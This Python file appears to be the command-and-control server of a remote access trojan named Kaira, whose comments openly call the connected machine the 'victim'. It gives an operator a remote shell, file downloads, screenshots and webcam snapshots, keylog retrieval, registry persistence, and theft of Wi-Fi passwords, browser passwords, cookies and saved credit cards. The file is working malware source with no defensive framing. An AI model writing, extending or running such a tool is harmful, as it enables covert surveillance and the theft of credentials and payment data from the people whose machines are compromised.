# A module for managing connections and sending commands to client.

import socket
from colorama import init,Fore
from os import system
from datetime import datetime

init()


class Kaira_Server():
    def __init__(self, host, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Making TCP connection.
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind((host, port))
        try:
            self.s.listen(0)
            print(Fore.GREEN + f"[+]Listening connections on IP : {host} Port : {port}\n")
            self.connection, addr = self.s.accept() # Accepting a connection from victim.
        except KeyboardInterrupt:
            print(Fore.MAGENTA + "\n[!]CTRL+C detected.Exiting...")
            exit()
        print(Fore.MAGENTA + f"[!]Connection established with : {addr}\n")
        some_creds = self.connection.recv(128).decode() # When the connection established, client sends a few data with delimiter(\t).
        some_creds = some_creds.split("\t")
        self.computer_name = some_creds[0] # Client's computer name.
        self.public_ip_address = some_creds[1] # Client's external network ip address(public ip address).
        self.platform = some_creds[2] # Client's platform(windows etc.)
        self.current_dir = some_creds[3] # For shell command, i added a feature to show current live location on shell terminal.So this needed.

    def download_file(self, file_name): # A function for downloading files from client.It understand that the download is finished via triggering timeout.
        chunk = self.connection.recv(1024)
        if chunk.decode(errors="ignore") == "[-]File downloading failed." or chunk.decode(errors="ignore") == "ss_download_error  " or chunk.decode(errors="ignore") == "camera_download_error  " or chunk.decode(errors="ignore") == "key_error  ":
            return "error" # If an error occurs in client, it detects and server will not crash.
        else: # Opening files depending on command_input.
            if self.command_input == "screenshot":
                file = open(f"downloads/screenshots/{file_name}", "wb")
                file.write(chunk)
                result = f"[+]Screenshot saved to /downloads/screenshots/{file_name}"
            elif self.command_input == "camera_snapshot":
                file = open(f"downloads/camera_snapshots/{file_name}", "wb")
                file.write(chunk)
                result = f"[+]Camera snapshot saved to /downloads/camera_snapshots/{file_name}"
            elif self.command_input == "get_keys":
                file = open(f"downloads/key_logs/{file_name}", "wb")
                file.write(chunk)
                result = f"[+]Keylog saved to /downloads/key_logs/{file_name}"
            else:
                file = open(f"downloads/{file_name}", "wb")
                file.write(chunk)
                result = f"[+]{file_name} saved to /downloads/{file_name}"
            self.connection.settimeout(2) # Timeout for downloading.
            while True:
                try:
                    chunk = self.connection.recv(1024, socket.MSG_WAITALL) # If there is not timeout, it gets file_content and saves the content.
                    file.write(chunk)
                except socket.timeout: # When the timeout occurs, file is closed and returns result.
                    file.close()
                    self.connection.settimeout(0.0)
                    self.connection.setblocking(1)
                    return result

    def create_file_name(self): # A function for creating file_names with date.
        date = datetime.now()
        if self.command_input == "screenshot":
            file_name = f"{date.day}.{date.month}.{date.year}_{date.hour}:{date.minute}:{date.second}_screenshot.png"
        elif self.command_input == "camera_snapshot":
            file_name = f"{date.day}.{date.month}.{date.year}_{date.hour}:{date.minute}:{date.second}_camera_snapshot.png"
        elif self.command_input == "get_keys":
            file_name = f"{date.day}.{date.month}.{date.year}_{date.hour}:{date.minute}:{date.second}_keylog.txt"
        elif self.command_input == "browser_pass":
            file_name = f"{date.day}.{date.month}.{date.year}_{date.hour}:{date.minute}:{date.second}_browser_passwords.txt"
        return file_name

    def shell(self): # You can execute commands from victim's shell terminal directly.
        print(Fore.BLUE + "[?]For command list, type 'help'.\n\n")
        while True:
            try:
                shell_command = input(Fore.RED + "┎──────(" + Fore.MAGENTA + "shell@" + self.computer_name + Fore.RED + ")" + Fore.YELLOW + "-" + Fore.RED + "[" + Fore.GREEN + self.current_dir + Fore.RED + "]" + Fore.RED +"\n┃\n┗──$" + Fore.GREEN)
            except KeyboardInterrupt:
                self.connection.send("exit".encode())
                print(Fore.MAGENTA + "\n\n[!]CTRL+C detected.Exiting from shell.")
                return 0
            self.splitted_shell_command = shell_command.split(" ")
            if self.splitted_shell_command[0] == "download" and len(self.splitted_shell_command) > 1: # You can download files from victim's computer.
                self.connection.send(shell_command.encode())
                command_output = self.download_file(self.splitted_shell_command[1])
                if command_output == "error":
                    print(Fore.RED + "[-]File downloading failed.")
                else:
                    print(Fore.GREEN + command_output)
            elif shell_command == "help":
                print(Fore.GREEN + self.help_shell())

            elif shell_command == "clear":
                system("clear")

            elif shell_command == "exit":
                self.connection.send("exit".encode())
                return 0
            else: # Directly executes command in victim's shell and prints full output.
                self.connection.send(shell_command.encode())            
                chunk = self.connection.recv(1024)
                shell_command_output = chunk.decode()
                self.connection.settimeout(0.5)
                while True:
                    try:
                        chunk = self.connection.recv(1024, socket.MSG_WAITALL)
                    except socket.timeout:
                        splitted_shell_command_output = shell_command_output.split("\t")
                        if self.splitted_shell_command[0] == "cd" and len(self.splitted_shell_command) > 1: # if command is 'cd' current_dir is changed.
                            print(Fore.BLUE + splitted_shell_command_output[0])
                            self.current_dir = splitted_shell_command_output[1]
                            self.connection.settimeout(0.0)
                            self.connection.setblocking(1)
                            break
                        else:
                            print(Fore.BLUE + shell_command_output)
                            self.connection.settimeout(0.0)
                            self.connection.setblocking(1)
                            break
                    shell_command_output = shell_command_output + chunk.decode(errors="ignore")


    def help_main(self):
        with open("menus/menu_main.txt", "r") as main_menu:
            return main_menu.read()
        
    def help_shell(self):
        with open("menus/menu_shell.txt", "r") as shell_menu:
            return shell_menu.read()

    
    def core(self): # Core terminal for main commands.
        print(Fore.BLUE + "[?]For command list, type 'help'.\n\n")
        while True:
            try:
                self.command_input = input(Fore.RED + "┎──────" + Fore.BLUE + f"({self.computer_name}@{self.public_ip_address})" + Fore.RED + "\n┃\n┗──$" + Fore.MAGENTA)
                self.splitted_command = self.command_input.split(" ")
            except KeyboardInterrupt:
                self.connection.send("exit".encode())
                print(Fore.MAGENTA + "\n\n[!]CTRL+C detected.Exiting...")
                exit()

            if self.command_input == "shell": # Switches to shell terminal.
                self.connection.send("shell".encode())
                self.shell()

            elif self.command_input == "screenshot": 
                self.connection.send("screenshot".encode())
                screenshot_state = self.connection.recv(10).decode() # A data comes from client to inform can client be able to take screenshot.
                if screenshot_state == "ss_success":
                    print(Fore.GREEN + "[+]Screenshot taken successfully.")
                else:
                    print(Fore.RED + "[-]Screenshot couldn't taken.")
                ss_state = self.download_file(self.create_file_name()) # Then takes screenshot content and saves.
                if ss_state == "error":
                    print(Fore.RED + "[-]Screenshot couldn't saved.")
                else:
                    print(Fore.GREEN + ss_state)

            elif self.command_input == "camera_snapshot": # Same with screenshot logic.
                self.connection.send("camera_snapshot".encode())
                camera_state = self.connection.recv(14).decode()
                if camera_state == "camera_success":
                    print(Fore.GREEN + "[+]Camera snapshot taken successfully.")
                    cam_state = self.download_file(self.create_file_name())
                    if cam_state == "error":
                        print(Fore.RED + "[-]Camera snapshot couldn't saved.")
                    else:
                        print(Fore.GREEN + cam_state)
                else:
                    print(Fore.RED + "[-]Camera snapshot couldn't taken.")
                    print(Fore.RED + "[-]Camera snapshot couldn't saved.")

            elif self.command_input == "read_keys": # Takes keylogs from client and prints to terminal.
                self.connection.send("read_keys".encode())
                chunk = self.connection.recv(1024)
                log = chunk.decode()
                self.connection.settimeout(0.5)
                while True:
                    try:
                        chunk = self.connection.recv(1024, socket.MSG_WAITALL)
                    except socket.timeout:
                        print(Fore.BLUE + log)
                        self.connection.settimeout(0.0)
                        self.connection.setblocking(1)
                        break
                    log = log + chunk.decode(errors="ignore")
            
            elif self.command_input == "get_keys": # Similar to read_keys but saves keylogs to a file.
                    self.connection.send("get_keys".encode())
                    key_state = self.download_file(self.create_file_name())
                    if key_state == "error":
                        print(Fore.RED + "[-]Keylog file couldn't saved.")
                    else:
                        print(Fore.GREEN + key_state)

                
            elif self.command_input == "persistence": # Activating persistence with registry.
                self.connection.send("persistence".encode())
                persistence = self.connection.recv(31).decode()
                if persistence == "[+]Persistence activated.      ":
                    print(Fore.GREEN + persistence)
                else:
                    print(Fore.RED + persistence)
            
            elif self.command_input == "remove_persistence": # Removing persistence.
                self.connection.send("remove_persistence".encode())
                remove_persistence = self.connection.recv(33).decode()
                if remove_persistence == "[+]Persistence deactivated.      ":
                    print(Fore.GREEN + remove_persistence)
                else:
                    print(Fore.RED + remove_persistence)
            
            elif self.command_input == "get_wifi": # Getting wifi usernames and passwords from client.
                if self.platform == "nt":
                    self.connection.send("get_wifi".encode())
                    wifi_ = self.connection.recv(1024).decode()
                    if not wifi_ == "[-]Can't get wifi creds.":
                        print(Fore.GREEN + wifi_)
                    else:
                        print(Fore.RED + wifi_)
                else:
                    print(Fore.RED + "[-]Target is using Linux OS.Wifi command is working for windows for now.")

            elif self.command_input == "system_info": # Executing 'system_info' command on client and prints its output.
                self.connection.send(self.command_input.encode())            
                chunk = self.connection.recv(1024)
                command_output = chunk.decode()
                self.connection.settimeout(0.5)
                while True:
                    try:
                        chunk = self.connection.recv(1024, socket.MSG_WAITALL)
                    except socket.timeout:
                        print(Fore.GREEN + command_output)
                        self.connection.settimeout(0.0)
                        self.connection.setblocking(1)
                        break
                    command_output = command_output + chunk.decode(errors="ignore")

            elif self.splitted_command[0] == "get_browser_pass": # Gets client's browser saved passwords with given name or prints all.
# I need to add an parameter to save this output.
                if len(self.splitted_command) > 1:
                    self.connection.send(self.command_input.encode())
                else:
                    self.connection.send((self.command_input + " ").encode())
                chunk = self.connection.recv(1024)
                browser_passwords = chunk.decode()
                self.connection.settimeout(0.5)
                while True:
                    try:
                        chunk = self.connection.recv(1024, socket.MSG_WAITALL)
                    except socket.timeout:
                        if browser_passwords == "[-]No passwords found.":
                            print(Fore.RED + f"[-]No {self.splitted_command[1]} passwords found.")
                        else:
                            print(Fore.GREEN + browser_passwords)
                        self.connection.settimeout(0.0)
                        self.connection.setblocking(1)
                        break
                    browser_passwords = browser_passwords + chunk.decode(errors="ignore")

            elif self.splitted_command[0] == "get_cookie": # Gets client's browser saved cookies with given name or prints all.
# I need to add an parameter to save this output.
                if len(self.splitted_command) > 1:
                    self.connection.send(self.command_input.encode())
                else:
                    self.connection.send((self.command_input + " ").encode())
                chunk = self.connection.recv(1024)
                browser_cookies = chunk.decode()
                self.connection.settimeout(0.5)
                while True:
                    try:
                        chunk = self.connection.recv(1024, socket.MSG_WAITALL)
                    except socket.timeout:
                        if browser_cookies == "[-]No cookies found.":
                            print(Fore.RED + f"[-]No {self.splitted_command[1]} cookies found.")
                        else:
                            print(Fore.GREEN + browser_cookies)
                        self.connection.settimeout(0.0)
                        self.connection.setblocking(1)
                        break
                    browser_cookies = browser_cookies + chunk.decode(errors="ignore")

            elif self.command_input == "get_browser_cc": # Gets client's browser saved credit card details.(If credit card doesn't saved with Gpay.)
# I need to add an parameter to save this output.
                self.connection.send("get_browser_cc".encode())
                chunk = self.connection.recv(1024)
                cc = chunk.decode()
                self.connection.settimeout(0.5)
                while True:
                    try:
                        chunk = self.connection.recv(1024, socket.MSG_WAITALL)
                    except socket.timeout:
                        if cc == "[-]No credit cards found.":
                            print(Fore.RED + "[-]No credit cards found.")
                        else:
                            print(Fore.GREEN + cc)
                        self.connection.settimeout(0.0)
                        self.connection.setblocking(1)
                        break
                    cc = cc + chunk.decode(errors="ignore")


            elif self.command_input == "shutdown": # Shutdowns the client computer via triggering shutdown command.
                self.connection.send("shutdown".encode())
                print(Fore.GREEN + self.connection.recv(128).decode())

            elif self.command_input == "clear":
                system("clear")

            elif self.command_input == "exit":
                self.connection.send("exit".encode())
                print(Fore.MAGENTA + "[!]Exiting...")
                self.connection.close()
                exit()

            elif self.command_input == "help":
                print(Fore.GREEN + self.help_main())
            
            else:
                print(Fore.RED + "[-]Unknown command.Type 'help' for command list.")

